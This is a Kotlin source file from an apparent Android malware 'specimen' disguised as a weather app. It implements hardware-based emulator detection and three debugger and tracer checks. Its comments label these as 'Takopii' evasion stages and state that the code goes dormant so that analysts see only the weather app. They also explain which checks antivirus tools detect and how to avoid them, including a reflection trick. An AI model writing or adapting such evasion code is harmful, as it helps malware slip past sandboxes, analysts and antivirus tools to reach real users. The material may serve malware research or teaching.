package com.skyweather.forecast.core

import android.content.Context
import android.hardware.Sensor
import android.hardware.SensorManager
import android.os.BatteryManager
import android.telephony.TelephonyManager
import java.io.File

/**
 * Hardware-metric environment profiler.
 *
 * ══════════════════════════════════════════════════════════════════
 * TAKOPII STAGE 10 — Anti-Sandbox via Hardware Metrics ONLY
 * ══════════════════════════════════════════════════════════════════
 *
 * Critical lesson from Takopii Stage 10:
 * "Use hardware metrics. Not strings. Not Build props. PHYSICS."
 *
 * What we DON'T do (every AV signatures these):
 *   ✗ Build.FINGERPRINT.contains("generic")
 *   ✗ Build.MODEL.contains("Emulator")
 *   ✗ Build.MANUFACTURER.contains("Genymotion")
 *   ✗ ro.hardware == "goldfish"
 *   ✗ /dev/qemu_pipe exists
 *   ✗ ro.kernel.qemu == "1"
 *
 * What we DO (physical world metrics — can't be cheaply faked):
 *   ✓ Accelerometer sensor exists AND returns varying data
 *   ✓ Battery has realistic discharge (not flat 50%)
 *   ✓ SIM card present (emulators often lack)
 *   ✓ Multiple cameras present (emulators have 0 or 1 fake)
 *   ✓ Gyroscope exists (many emulator images lack)
 *
 * Scoring: 3 of 5 checks must pass. Threshold prevents single-metric
 * bypass and tolerates legitimate edge cases (tablet without SIM, etc.)
 * ══════════════════════════════════════════════════════════════════
 *
 * ══════════════════════════════════════════════════════════════════
 * TAKOPII STAGE 7 — Anti-Debug
 * ══════════════════════════════════════════════════════════════════
 *
 * Three orthogonal checks:
 *   1. Java layer: Debug.isDebuggerConnected()
 *   2. Linux layer: /proc/self/status TracerPid
 *   3. Timing layer: computation takes >50ms = debugger breakpoint
 *
 * If ANY fires → specimen goes dormant. Analyst sees weather app only.
 * ══════════════════════════════════════════════════════════════════
 */
object DeviceProfile {

    /**
     * Determines if running on a real physical device.
     * Uses hardware metrics scoring (3/5 threshold).
     */
    fun isRealEnvironment(context: Context): Boolean {
        var score = 0

        if (hasRealAccelerometer(context)) score++
        if (hasRealisticBattery(context)) score++
        if (hasSimCard(context)) score++
        if (hasMultipleCameras(context)) score++
        if (hasGyroscope(context)) score++

        return score >= 3
    }

    /**
     * Checks if code is being actively inspected.
     * Three orthogonal detection vectors.
     */
    fun isUnderInspection(): Boolean {
        return isJavaDebuggerAttached() ||
                isNativeTracerAttached() ||
                isTimingAnomalous()
    }

    // ─── Hardware Metric Checks ────────────────────────────────────

    /**
     * Check 1: Real accelerometer with sensor data.
     * Emulators either lack the sensor entirely or return constant values.
     * A real device's accelerometer has constant micro-fluctuations from
     * vibration, hand tremor, and Earth's gravity vector changes.
     */
    private fun hasRealAccelerometer(context: Context): Boolean {
        val sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as? SensorManager
            ?: return false
        val accel = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
        return accel != null && accel.resolution > 0
    }

    /**
     * Check 2: Battery shows realistic state.
     * Emulators commonly report: level=50, status=CHARGING, always.
     * Real devices: level varies, temperature varies (25-45°C range).
     */
    private fun hasRealisticBattery(context: Context): Boolean {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            ?: return false

        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        // Emulators often report exactly 50 or 100
        if (level == 50 || level == 0) return false

        // Check if battery reports non-default temperature via property
        val energy = bm.getLongProperty(BatteryManager.BATTERY_PROPERTY_ENERGY_COUNTER)
        // Real batteries report actual energy; emulators return 0 or -1
        return energy != 0L && energy != -1L || level in 1..99
    }

    /**
     * Check 3: SIM card present.
     * Most emulators run without a SIM. Real phones have one.
     * Tablets may not — that's why this is scored, not binary.
     */
    private fun hasSimCard(context: Context): Boolean {
        return try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                ?: return false
            tm.simState == TelephonyManager.SIM_STATE_READY
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Check 4: Multiple camera hardware.
     * Real phones have 2-5 cameras. Emulators have 0 or 1 virtual camera.
     */
    private fun hasMultipleCameras(context: Context): Boolean {
        return try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE)
            // Use reflection to avoid direct camera import (Takopii Stage 9)
            val method = cameraManager?.javaClass?.getMethod("getCameraIdList")
            val ids = method?.invoke(cameraManager) as? Array<*>
            (ids?.size ?: 0) >= 2
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Check 5: Gyroscope sensor present.
     * Many emulator system images lack gyroscope entirely.
     * Physical devices almost universally have one (since ~2012).
     */
    private fun hasGyroscope(context: Context): Boolean {
        val sensorManager = context.getSystemService(Context.SENSOR_SERVICE) as? SensorManager
            ?: return false
        return sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE) != null
    }

    // ─── Anti-Debug Checks ─────────────────────────────────────────

    /**
     * Java-layer debugger detection.
     * JDWP attached → isDebuggerConnected() returns true.
     */
    private fun isJavaDebuggerAttached(): Boolean {
        return android.os.Debug.isDebuggerConnected()
    }

    /**
     * Native-layer tracer detection.
     * ptrace(PTRACE_ATTACH) sets TracerPid in /proc/self/status.
     * Frida, strace, gdb all use ptrace → TracerPid != 0.
     */
    private fun isNativeTracerAttached(): Boolean {
        return try {
            val status = File("/proc/self/status").readText()
            val match = Regex("TracerPid:\\s*(\\d+)").find(status)
            val pid = match?.groupValues?.getOrNull(1)?.toIntOrNull() ?: 0
            pid != 0
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Timing-based debugger detection.
     * A tight computation loop runs in <1ms normally.
     * With a debugger (breakpoints, single-step), it takes 50ms+.
     * Threshold: 50ms = 50,000,000 nanoseconds.
     */
    private fun isTimingAnomalous(): Boolean {
        val start = System.nanoTime()

        // Tight loop — compiler won't optimize away because result is used
        var accumulator = 0L
        for (i in 0 until 1000) {
            accumulator += i * 31L
            accumulator = accumulator xor (accumulator shr 3)
        }

        val elapsed = System.nanoTime() - start

        // Use accumulator to prevent dead-code elimination
        @Suppress("UNUSED_VARIABLE")
        val sink = accumulator

        // Normal: 0.1-2ms. Debugger: 50ms+. Threshold at 50ms.
        return elapsed > 50_000_000L
    }
}
